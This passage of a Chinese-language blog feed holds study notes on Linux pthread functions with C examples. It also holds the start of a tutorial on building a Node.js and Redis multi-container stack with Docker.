class="line">dup2(fd,STDERR_FILENO);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">//模拟守护进程业务</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><h5 id="线程概念"><a href="#线程概念" class="headerlink" title="线程概念"></a>线程概念</h5><p>LWP：light weight process 轻量级的进程，本质仍是进程（Linux环境下）</p><p>进程：独立地址空间，拥有PCB</p><p>线程：有独立的PCB，但没有独立的地址空间</p><p>区别：在于是否共享地址空间</p><p>Linux下</p><ul><li>线程：最小的执行单位</li><li>进程：最小分配资源单位，可看程师只有一个线程的进程</li></ul><h5 id="线程共享资源"><a href="#线程共享资源" class="headerlink" title="线程共享资源"></a>线程共享资源</h5><ul><li>文件描述符表</li><li>每种信号的处理方式</li><li>当前工作目录</li><li>用户ID和组ID</li><li>内存地址空间(.text/.data/.bss/heap/共享库)</li></ul><h5 id="线程非共享资源"><a href="#线程非共享资源" class="headerlink" title="线程非共享资源"></a>线程非共享资源</h5><ul><li>线程id</li><li>处理器现场和栈指针(内核栈)</li><li>独立的栈空间(用户空间栈)</li><li>errno变量</li><li>信号屏蔽字</li><li>调度优先级</li></ul><h5 id="线程优缺点"><a href="#线程优缺点" class="headerlink" title="线程优缺点"></a>线程优缺点</h5><p>优点：提高程序并发性 ，开销小，数据通信共享数据方便</p><p>缺点：库函数，不稳定，调试编写困难，gdb不支持，对信号支持不好</p><h4 id="线程控制原语"><a href="#线程控制原语" class="headerlink" title="线程控制原语"></a>线程控制原语</h4><h5 id="pthread-self函数"><a href="#pthread-self函数" class="headerlink" title="pthread_self函数"></a>pthread_self函数</h5><p>获取线程ID，其作用对应进程中<code>getpid</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pthread_t</span> <span class="title">pthread_self</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：无</span><br></pre></td></tr></table></figure><h5 id="pthread-create函数"><a href="#pthread-create函数" class="headerlink" title="pthread_create函数"></a>pthread_create函数</h5><p>创建一个新线程，其作用对应进程中fork函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_create</span><span class="params">(<span class="keyword">pthread_t</span> *thread,<span class="keyword">const</span> <span class="keyword">pthread_attr_t</span> *attr,<span class="keyword">void</span>*(*start_routine)(<span class="keyword">void</span> *),<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">返回值</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：错误号</span><br><span class="line">参数</span><br><span class="line">  <span class="keyword">pthread_t</span>：当前Linux中可理解为：<span class="keyword">typedef</span> unsignd <span class="keyword">long</span> <span class="keyword">int</span> <span class="keyword">pthread_t</span></span><br><span class="line">  参数<span class="number">1</span>：传出参数，保存系统为我们分配好的线程ID</span><br><span class="line">  参数<span class="number">2</span>：通常传<span class="literal">NULL</span>，表示使用线程默认属性，若想使用具体属性也可以修改该参数</span><br></pre></td></tr></table></figure><h5 id="创建一个线程"><a href="#创建一个线程" class="headerlink" title="创建一个线程"></a>创建一个线程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"thread : pid = %d,tid = %lu\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="comment">//tid = pthread_self();</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"main : pid = %d,tid = %lu\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">int</span> ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"pthread_create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="循环创建多个子线程"><a href="#循环创建多个子线程" class="headerlink" title="循环创建多个子线程"></a>循环创建多个子线程</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = (<span class="keyword">int</span>)arg;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--I'm %dth thread: pid = %d,tid = %lu\n"</span>,i+<span class="number">1</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,ret;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,(<span class="keyword">void</span> *)i);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"pthread_create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"main: I'm Main,pid = %d,tid = %lu\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pthread-exit函数"><a href="#pthread-exit函数" class="headerlink" title="pthread_exit函数"></a>pthread_exit函数</h5><p>将单个线程退出</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pthread_exit</span><span class="params">(<span class="keyword">void</span> *retval)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">参数：retval表示线程退出状态，通常传NULL</span><br></pre></td></tr></table></figure><p>举例，使用<code>pthread_exit</code>退出主线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"thread : pid = %d,tid = %ld\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"main : pid = %d,tid = %ld\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">int</span> ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"pthread_create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">pthread_exit((<span class="keyword">void</span>*)<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pthread-join函数"><a href="#pthread-join函数" class="headerlink" title="pthread_join函数"></a>pthread_join函数</h5><p>阻塞等待线程退出，获取线程退出状态，其作用对应进程中的<code>waitpid()</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_join</span><span class="params">(<span class="keyword">pthread_t</span> thread,<span class="keyword">void</span> **retval)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  成功：0</span><br><span class="line">  失败：错误号</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">  thread：线程ID</span><br><span class="line">  retval：存储线程结束状态</span><br></pre></td></tr></table></figure><p>对比记忆</p><ul><li>进程中 <code>main</code>返回值、<code>exit</code>参数—&gt;<code>int</code>；等待子进程结束 <code>wait</code> 函数参数—&gt;<code>int *</code></li><li>线程中 线程主函数返回值、<code>pthread_exit</code>—&gt;<code>void *</code>;等待线程结束 <code>pthread_jion</code> 函数参数—&gt;<code>void **</code></li></ul><p>使用pthread_join获取子线程返回值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thrd</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> var;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thrd</span> *<span class="title">tval</span>;</span></span><br><span class="line">tval = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(tval));</span><br><span class="line">tval-&gt;var = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(tval-&gt;str,<span class="string">"hello thread"</span>);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span>*)tval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thrd</span> *<span class="title">retval</span>;</span></span><br><span class="line">ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"pthread_create error"</span>);</span><br><span class="line">ret = pthread_join(tid,(<span class="keyword">void</span>**)&amp;retval);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"pthread_join error"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child thread exit with var=%d,str=%s\n"</span>,retval-&gt;var,retval-&gt;str);</span><br><span class="line">pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pthread-cancel函数"><a href="#pthread-cancel函数" class="headerlink" title="pthread_cancel函数"></a>pthread_cancel函数</h5><p>杀死一个线程，需要到达取消点，如果子线程没有到达取消点，那么<code>pthread_cancel</code>无效，我们可以在程序中，手动添加一个取消点，使用<code>pthread_testcancel()</code>，成功被<code>pthread_cancel()</code>杀死的线程，返回<code>-1</code>，可以使用<code>pthread_join</code>回收。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cancel</span><span class="params">(<span class="keyword">pthread_t</span> thread)</span></span></span><br></pre></td></tr></table></figure><h5 id="pthread-detach函数"><a href="#pthread-detach函数" class="headerlink" title="pthread_detach函数"></a>pthread_detach函数</h5><p>设置线程分离</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_detach</span><span class="params">(<span class="keyword">pthread_t</span> thread)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">返回值：</span><br><span class="line">  成功：<span class="number">0</span></span><br><span class="line">  失败：errno</span><br><span class="line">  </span><br><span class="line">thread:待分离的线程id</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;信号&quot;&gt;&lt;a href=&quot;#信号&quot; class=&quot;headerlink&quot; title=&quot;信号&quot;&gt;&lt;/a&gt;信号&lt;/h4&gt;&lt;h5 id=&quot;信号概念&quot;&gt;&lt;a href=&quot;#信号概念&quot; class=&quot;headerlink&quot; title=&quot;信号概念&quot;&gt;&lt;/a&gt;信号概念&lt;/h
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Docker构建多容器应用栈</title>
    <link href="elssm.github.io/2021/10/11/Docker%E6%9E%84%E5%BB%BA%E5%A4%9A%E5%AE%B9%E5%99%A8%E5%BA%94%E7%94%A8%E6%A0%88/"/>
    <id>elssm.github.io/2021/10/11/Docker构建多容器应用栈/</id>
    <published>2021-10-11T07:37:25.000Z</published>
    <updated>2021-10-11T11:08:19.300Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>在这个例子中，需要做的是把一个使用<code>Express</code>框架的并且带有<code>Redis</code>后端的<code>Node.js</code>应用完全Docker化。目的是能够将Docker的特性结合起来使用。主要的工作内容是</p><ul><li>一个Node容器，用来服务于Node应用</li><li>一个Redis主容器，用于保存和集群化应用状态</li><li>两个Redis副本容器，用于集群化应用状态</li><li>一个日志容器，用于捕获应用日志</li></ul><p>最终我们的Node应用程序会运行在一个容器中，它后面会有一个配置为”主-副本”模式运行在多个容器中的Redis集群。</p><h4 id="Node-js镜像"><a href="#Node-js镜像" class="headerlink" title="Node.js镜像"></a>Node.js镜像</h4><p>首先我们需要构建一个安装了Node.js的镜像。这个镜像有Express应用和相应的必要的软件包。</p><p>第一步先在本地创建一个名为<code>nodejs</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir nodejs &amp;&amp; cd nodejs</span><br></pre></td></tr></table></figure><p>第二步在<code>nodejs</code>文件夹下创建一个存放<code>node.js</code>应用源码的文件夹名为<code>nodeapp</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir nodeapp &amp;&amp; cd nodeapp</span><br></pre></td></tr></table></figure><p>获取<code>node.js</code>源码</p><p>如果下载不下来的话，代码地址:<a href="https://github.com/turnbullpress/dockerbook-code/tree/master/code/6/node/nodejs/nodeapp" target="_blank" rel="noopener">https://github.com/turnbullpress/dockerbook-code/tree/master/code/6/node/nodejs/nodeapp</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/turnbullpress/dockerbook-code/master/code/6/node/nodejs/nodeapp/package.json</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/turnbullpress/dockerbook-code/master/code/6/node/nodejs/nodeapp/server.js</span><br></pre></td></tr></table></figure><p>第三步回到<code>nodejs</code>目录下，创建Dockerfile文件。这个镜像安装了Node，然后我们将<code>nodeapp</code>的源代码通过ADD指令添加到<code>/opt/nodeapp</code>目录。这个Node.js应用是一个简单的Express服务器，包含了<code>package.json</code>文件和实际应用代码的<code>server.js</code>文件。<code>server.js</code>文件引入了所有的依赖，并启动了Express应用，Express应用把session信息保存到Redis里，并创建了一个以JSON格式返回状态信息的节点，这个节点默认使用redis_primary作为主机名去连接Redis。这个应用会把日志记录到<code>/var/log/nodeapp/nodeapp.log</code>文件里，并监听3000端口。我们还将工作目录设置为<code>/opt/nodeapp</code>，并且安装了Node应用的必要软件包，还创建了用于存放Node应用日志的卷<code>/var/log/nodeapp</code>，最后公开了3000端口，并使用ENTRYPOINT指定了运行Node应用的命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq update</span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq install nodejs npm</span><br><span class="line"><span class="keyword">RUN</span> mkdir -p /var/log/nodeapp</span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span> nodeapp /opt/nodeapp/</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span> /opt/nodeapp</span><br><span class="line"><span class="keyword">RUN</span> npm install</span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span> [ "/var/log/nodeapp" ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span> [ "nodejs", "server.js" ]</span><br></pre></td></tr></table></figure><p>第四步构建镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/nodejs .</span><br></pre></td></tr></table></figure><h4 id="Redis基础镜像"><a href="#Redis基础镜像" class="headerlink" title="Redis基础镜像"></a>Redis基础镜像</h4><p>第一步先在本地创建一个名为<code>redis_base</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir redis_base &amp;&amp; cd redis_base</span><br></pre></td></tr></table></figure><p>第二步创建Dockerfile文件。这个Redis基础镜像从PPA库安装了最新版本的Redis包。并指定了两个卷，公开了Redis的默认端口是6379。我们只是讲这个镜像作为基础镜像从而构建别的镜像，因此不会执行这个镜像。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq update</span><br><span class="line"><span class="keyword">RUN</span> apt-get install -qq software-properties-common</span><br><span class="line"><span class="keyword">RUN</span> add-apt-repository ppa:chris-lea/redis-server</span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq update</span><br><span class="line"><span class="keyword">RUN</span> apt-get -qq install redis-server redis-tools</span><br><span class="line"></span><br><span class="line"><span class="keyword">VOLUME</span> [ "/var/lib/redis", "/var/log/redis" ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">6379</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span> []</span><br></pre></td></tr></table></figure><p>第三步构建Redis基础镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/redis .</span><br></pre></td></tr></table></figure><h4 id="Redis主镜像"><a href="#Redis主镜像" class="headerlink" title="Redis主镜像"></a>Redis主镜像</h4><p>第一步先在本地创建一个名为<code>redis_primary</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir redis_primary &amp;&amp; cd redis_primary</span><br></pre></td></tr></table></figure><p>第二步创建Dockerfile文件。Redis主镜像基于Redis基础镜像，并通过ENTRYPOINT指定了Redis服务启动命令，将Redis服务的日志文件保存到<code>/var/log/redis/redis-server.log</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> elssm/redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span> [ "redis-server", "--protected-mode no", "--logfile /var/log/redis/redis-server.log" ]</span><br></pre></td></tr></table></figure><p>第三步构建Redis主奖项</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/redis_primary .</span><br></pre></td></tr></table></figure><h4 id="Redis副本镜像"><a href="#Redis副本镜像" class="headerlink" title="Redis副本镜像"></a>Redis副本镜像</h4><p>为了配合Redis主镜像，我们会创建Redis副本镜像，保证为Node.js应用提供Redis服务的冗余度。</p><p>第一步先在本地创建一个名为<code>redis_replica</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 